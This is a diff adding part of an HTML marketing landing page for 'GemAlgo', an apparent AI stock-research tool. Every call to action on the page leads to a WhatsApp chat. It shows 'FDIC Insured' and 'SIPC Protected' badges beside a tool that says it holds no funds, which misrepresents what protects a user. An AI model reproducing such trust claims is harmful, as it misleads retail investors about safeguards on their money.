5.945L.057 24l6.305-1.654a11.882 11.882 0 0 0 5.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 0 0-3.48-8.413Z"/></svg>
+              <span>Chat on WhatsApp</span>
+            </button>
+          </div>
+        </div>
+
+        <div class="lg:col-span-3">
+          <div class="rounded-2xl border border-white/10 bg-white/[0.02] overflow-hidden">
+            <div class="flex items-center justify-between px-6 py-4 border-b border-white/5 bg-white/[0.02]">
+              <span class="font-mono text-[12px] text-slate-300">DEMO AGENDA</span>
+              <span class="font-mono text-[11px] text-slate-500">45 MIN · LIVE</span>
+            </div>
+            <ul class="divide-y divide-white/5">
+              <li class="flex items-start gap-4 px-6 py-4">
+                <span class="font-mono text-[13px] text-cyan-400 font-medium pt-0.5">01</span>
+                <span class="text-[14px] sm:text-[15px] text-slate-300 leading-relaxed">How the AI scans 3,000+ U.S. stocks and flags potential opportunities</span>
+              </li>
+              <li class="flex items-start gap-4 px-6 py-4">
+                <span class="font-mono text-[13px] text-cyan-400 font-medium pt-0.5">02</span>
+                <span class="text-[14px] sm:text-[15px] text-slate-300 leading-relaxed">How to read clear, plain-English insights — no finance degree required</span>
+              </li>
+              <li class="flex items-start gap-4 px-6 py-4">
+                <span class="font-mono text-[13px] text-cyan-400 font-medium pt-0.5">03</span>
+                <span class="text-[14px] sm:text-[15px] text-slate-300 leading-relaxed">How you stay in full control of your own brokerage account</span>
+              </li>
+              <li class="flex items-start gap-4 px-6 py-4">
+                <span class="font-mono text-[13px] text-cyan-400 font-medium pt-0.5">04</span>
+                <span class="text-[14px] sm:text-[15px] text-slate-300 leading-relaxed">How to build custom watchlists and alerts around the stocks you care about</span>
+              </li>
+              <li class="flex items-start gap-4 px-6 py-4">
+                <span class="font-mono text-[13px] text-cyan-400 font-medium pt-0.5">05</span>
+                <span class="text-[14px] sm:text-[15px] text-slate-300 leading-relaxed">How the built-in educational resources help you grow your confidence</span>
+              </li>
+              <li class="flex items-start gap-4 px-6 py-4">
+                <span class="font-mono text-[13px] text-cyan-400 font-medium pt-0.5">06</span>
+                <span class="text-[14px] sm:text-[15px] text-slate-300 leading-relaxed">How the risk-awareness tools help you understand what you're looking at</span>
+              </li>
+              <li class="flex items-start gap-4 px-6 py-4">
+                <span class="font-mono text-[13px] text-cyan-400 font-medium pt-0.5">07</span>
+                <span class="text-[14px] sm:text-[15px] text-slate-300 leading-relaxed">Ask us anything — no question is off limits</span>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ SECURITY / BROKERS — ASYMMETRIC SPLIT ============ -->
+  <section id="brokers" class="relative z-10 py-16 sm:py-24">
+    <div class="max-w-7xl mx-auto px-5 sm:px-8">
+      <div class="grid lg:grid-cols-2 gap-10 lg:gap-16 items-center" data-reveal>
+
+        <div>
+          <span class="inline-flex items-center gap-2 rounded-full border border-indigo-400/30 bg-indigo-400/10 px-3 py-1 text-[11px] uppercase tracking-[0.14em] font-mono text-indigo-300">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-3.5 h-3.5"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path><path d="m9 12 2 2 4-4"></path></svg>
+            Your Security
+          </span>
+          <h2 class="mt-6 font-display font-bold text-white text-[28px] sm:text-[36px] leading-tight tracking-[-0.01em]">Your Money Stays In Your Own <span class="text-transparent bg-clip-text bg-gradient-to-r from-emerald-400 to-cyan-400">Brokerage Account</span></h2>
+          <p class="mt-5 text-[15px] sm:text-[16px] text-slate-400 leading-relaxed">GemAlgo is a research and analysis tool — it never takes custody of your funds. Your money stays in your own U.S. regulated brokerage account, where you remain in full control.</p>
+
+          <div class="mt-8 space-y-4">
+            <div class="flex items-center gap-4 rounded-xl border border-white/10 bg-white/[0.02] p-4">
+              <div class="shrink-0 bg-white rounded-lg p-1.5"><img src="assets/fdic.png" alt="FDIC - Federal Deposit Insurance Corporation" class="object-contain" style="width: 64px; height: 40px;"></div>
+              <div><p class="text-[13px] text-white font-semibold">FDIC Insured</p><p class="text-[12px] text-slate-500 leading-snug">Federal Deposit Insurance Corporation</p></div>
+            </div>
+            <div class="flex items-center gap-4 rounded-xl border border-white/10 bg-white/[0.02] p-4">
+              <div class="shrink-0 bg-white rounded-lg p-1.5"><img src="assets/sipc.png" alt="SIPC - Securities Investor Protection Corporation" class="object-contain" style="width: 64px; height: 40px;"></div>
+              <div><p class="text-[13px] text-white font-semibold">SIPC Protected</p><p class="text-[12px] text-slate-500 leading-snug">Securities Investor Protection Corporation</p></div>
+            </div>
+          </div>
+          <p class="mt-5 text-[12.5px] text-slate-500 leading-relaxed">Brokerage accounts are typically FDIC and/or SIPC insured, providing industry-standard protections for your deposited funds and securities.</p>
+        </div>
+
+        <div>
+          <div class="rounded-2xl border border-white/10 bg-white/[0.02] p-2">
+            <div class="flex items-center justify-between px-4 pt-3 pb-2">
+              <span class="font-mono text-[11px] text-slate-500">COMPATIBLE BROKERAGES</span>
+            </div>
+            <div class="grid grid-cols-2 gap-2 p-2">
+              <div class="bg-white/[0.03] border border-white/10 rounded-xl p-4 flex items-center justify-center h-20 hover:border-cyan-400/30 transition-all duration-300"><img src="assets/broker-ib.webp" alt="Interactive Brokers" class="object-contain max-h-10" style="width: 180px; height: 48px; filter: brightness(0) invert(1) opacity(.85);"></div>
+              <div class="bg-white/[0.03] border border-white/10 rounded-xl p-4 flex items-center justify-center h-20 hover:border-cyan-400/30 transition-all duration-300"><img src="assets/broker-stonex.png" alt="StoneX" class="object-contain max-h-10" style="width: 140px; height: 40px; filter: brightness(0) invert(1) opacity(.85);"></div>
+              <div class="bg-white/[0.03] border border-white/10 rounded-xl p-4 flex items-center justify-center h-20 hover:border-cyan-400/30 transition-all duration-300"><img src="assets/broker-alpaca.png" alt="Alpaca" class="object-contain max-h-10" style="width: 130px; height: 40px; filter: brightness(0) invert(1) opacity(.85);"></div>
+              <div class="bg-white/[0.03] border border-white/10 rounded-xl p-4 flex items-center justify-center h-20 hover:border-cyan-400/30 transition-all duration-300"><img src="assets/broker-tastytrade.png" alt="TastyTrade" class="object-contain max-h-10" style="width: 150px; height: 40px; filter: brightness(0) invert(1) opacity(.85);"></div>
+              <div class="bg-white/[0.03] border border-white/10 rounded-xl p-4 flex items-center justify-center h-20 hover:border-cyan-400/30 transition-all duration-300"><img src="assets/broker-etrade.png" alt="E*TRADE" class="object-contain max-h-10" style="width: 140px; height: 40px; filter: brightness(0) invert(1) opacity(.85);"></div>
+              <div class="bg-white/[0.03] border border-white/10 rounded-xl p-4 flex items-center justify-center h-20 hover:border-cyan-400/30 transition-all duration-300"><img src="assets/broker-robinhood.png" alt="Robinhood" class="object-contain max-h-10" style="width: 140px; height: 40px; filter: brightness(0) invert(1) opacity(.85);"></div>
+              <div class="bg-white/[0.03] border border-white/10 rounded-xl p-4 flex items-center justify-center h-20 hover:border-cyan-400/30 transition-all duration-300"><img src="assets/broker-schwab.png" alt="Charles Schwab" class="object-contain max-h-10" style="width: 140px; height: 40px; filter: brightness(0) invert(1) opacity(.85);"></div>
+              <div class="bg-white/[0.03] border border-white/10 rounded-xl p-4 flex items-center justify-center h-20 hover:border-cyan-400/30 transition-all duration-300"><img src="assets/broker-webull.png" alt="Webull" class="object-contain max-h-10" style="width: 140px; height: 40px; filter: brightness(0) invert(1) opacity(.85);"></div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ GUARANTEE — SPLIT BANNER ============ -->
+  <section id="guarantee" class="relative z-10 py-16 sm:py-24">
+    <div class="max-w-6xl mx-auto px-5 sm:px-8">
+      <div class="relative overflow-hidden rounded-3xl border border-emerald-400/20 bg-gradient-to-br from-emerald-500/15 via-[#0a0f1c] to-cyan-500/10 p-8 sm:p-12" data-reveal>
+        <div class="absolute top-0 right-0 w-64 h-64 bg-emerald-400/10 rounded-full blur-3xl"></div>
+        <div class="absolute bottom-0 left-0 w-64 h-64 bg-cyan-400/10 rounded-full blur-3xl"></div>
+        <div class="relative z-10 flex flex-col lg:flex-row lg:items-center gap-8 lg:gap-12">
+          <div class="flex-1 flex flex-col sm:flex-row sm:items-center gap-5">
+            <div class="w-16 h-16 shrink-0 rounded-2xl bg-gradient-to-br from-emerald-400 to-cyan-400 flex items-center justify-center" style="box-shadow: 0 0 60px -20px rgba(52,211,153,.5);">
+              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#05080f" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" class="w-8 h-8"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path><path d="m9 12 2 2 4-4"></path></svg>
+            </div>
+            <div>
+              <h2 class="font-display font-bold text-white text-[24px] sm:text-[28px] tracking-tight">Simple &amp; Transparent</h2>
+              <p class="mt-2 text-[14px] sm:text-[15px] text-slate-300 leading-relaxed max-w-lg">Try GemAlgo and see if it's the right fit. If it's not for you within the first 30 days, contact us for a full refund of your subscription — no hard feelings.</p>
+            </div>
+          </div>
+          <button type="button" onclick="k2()" class="shrink-0 inline-flex items-center gap-2.5 px-8 py-3.5 rounded-full bg-white text-[#05080f] font-semibold text-[15px] transition-all duration-200 hover:bg-slate-200">
+            <svg viewBox="0 0 24 24" fill="currentColor" class="w-5 h-5 text-emerald-600"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 0 1-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 0 1-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 0 1 2.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0 0 12.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 0 0 5.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 0 0-3.48-8.413Z"/></svg>
+            <span>Chat on WhatsApp</span>
+          </button>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ FINAL CTA ============ -->
+  <section class="relative z-10 pt-8 pb-20 sm:pb-28">
+    <div class="max-w-4xl mx-auto px-5 sm:px-8">
+      <div class="rounded-3xl border border-white/10 bg-gradient-to-b from-white/[0.05] to-transparent p-8 sm:p-14 text-center" data-reveal>
+        <p class="font-display font-bold text-white text-[20px] sm:text-[26px] md:text-[30px] tracking-tight">Ready To Make Smarter, More Informed Investing Decisions?</p>
+        <p class="mt-4 text-[14px] sm:text-[15px] text-slate-400">Book your free demo and see how the AI works — with no obligation.</p>
+        <div class="mt-8 flex flex-col items-center gap-5">
+          <button type="button" onclick="k2()" class="group relative inline-flex items-center gap-3 px-12 sm:px-14 py-4 rounded-full bg-gradient-to-r from-emerald-400 to-cyan-400 text-[#05080f] transition-all duration-200 hover:shadow-[0_0_50px_-8px_rgba(34,211,238,.7)] hover:scale-[1.02] text-[16px] sm:text-[18px] font-semibold">
+            <svg viewBox="0 0 24 24" fill="currentColor" class="w-6 h-6 shrink-0"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 0 1-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 0 1-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 0 1 2.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0 0 12.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 0 0 5.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 0 0-3.48-8.413Z"/></svg>
+            <span>Chat on WhatsApp</span>
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-5 h-5 transition-transform group-hover:translate-x-0.5"><path d="M5 12h14"></path><path d="m12 5 7 7-7 7"></path></svg>
+          </button>
+          <div class="text-[12.5px] text-slate-500">No credit card required · No obligation</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ FOOTER ============ -->
+  <footer class="relative z-10 border-t border-white/5 bg-black/20 pt-12 pb-32 lg:pb-12 px-6">
+    <div class="max-w-4xl mx-auto space-y-8">
+      <div class="flex flex-wrap justify-center items-center gap-6 text-[14px]">
+        <a href="" target="_blank" rel="noopener noreferrer" class="text-slate-500 hover:text-cyan-400 transition-colors">Privacy Policy</a>
+        <span class="text-slate-700">|</span>
+        <a href="" target="_blank" rel="noopener noreferrer" class="text-slate-500 hover:text-cyan-400 transition-colors">Terms &amp; Conditions</a>
+        <span class="text-slate-700">|</span>
+        <a href="" target="_blank" rel="noopener noreferrer" class="text-slate-500 hover:text-cyan-400 transition-colors">Full Disclosures</a>
+      </div>
+      <p class="text-center text-[13px] leading-relaxed text-slate-500 max-w-[800px] mx-auto">GemAlgo is an educational and software tool for research and analysis. It does not provide financial advice, does not manage investments, and does not guarantee any investment results. Investing involves risk, including the possible loss of your principal. Past performance does not guarantee future results. Always do your own research and consult a licensed financial professional before making investment decisions. See Full Disclosures for details.</p>
+      <p class="text-center text-[13px] leading-relaxed text-slate-500 max-w-[800px] mx-auto">CFTC Rules 4.41 - Hypothetical or Simulated performance results have certain limitations; unlike an actual performance record, simulated results do not represent actual trading. Also, since the trades have not been executed, the results may have under- or over-compensated for the impact, if any, of certain market factors, such as lack of liquidity. Simulated trading programs in general are also subject to the fact that they are designed with the benefit of hindsight. No representation is being made that any account will or is likely to achieve profit or losses similar to those shown.</p>
+      <p class="text-center text-[13px] leading-relaxed text-slate-500 max-w-[800px] mx-auto">This site is not a part of Facebook, Instagram or Meta Inc. Additionally, This site is NOT endorsed by Facebook in any way. FACEBOOK is a trademark of FACEBOOK, Inc.</p>
+      <p class="text-center text-[14px] text-slate-400">© Copyright 2026. All Rights Reserved.</p>
+    </div>
+  </footer>
+
+</div>
+
+<!-- ============ MOBILE FLOATING WHATSAPP CTA ============ -->
+<div class="fixed bottom-0 inset-x-0 z-50 lg:hidden pointer-events-none">
+  <div class="px-4 pt-6 pb-4 bg-gradient-to-t from-[#05080f] via-[#05080f]/85 to-transparent" style="padding-bottom: calc(1rem + env(safe-area-inset-bottom));">
+    <button type="button" onclick="k2()" class="pointer-events-auto w-full flex items-center justify-center gap-2.5 py-4 rounded-2xl bg-gradient-to-r from-emerald-400 to-cyan-400 text-[#05080f] font-semibold text-[16px] shadow-2xl shadow-black/50 active:scale-[0.99] transition-transform">
+      <svg viewBox="0 0 24 24" fill="currentColor" class="w-6 h-6 shrink-0"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 0 1-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 0 1-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 0 1 2.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0 0 12.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 0 0 5.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 0 0-3.48-8.413Z"/></svg>
+      <span>Chat on WhatsApp</span>
+    </button>
+  </div>
+</div>
+
+<script>
+  (function () {
+    var els = document.querySelectorAll('[data-reveal]');
+    if (!('IntersectionObserver' in window)) { return; }
+    els.forEach(function (el) { el.classList.add('reveal-init'); });
+    var io = new IntersectionObserver(function (entries) {
+      entries.forEach(function (e) {
+        if (e.isIntersecting) { e.target.classList.add('reveal-in'); io.unobserve(e.target); }
+      });
+    }, { threshold: 0.1 });
+    els.forEach(function (el) { io.observe(el); });
+  })();
+</script>
+</body>
+</html>
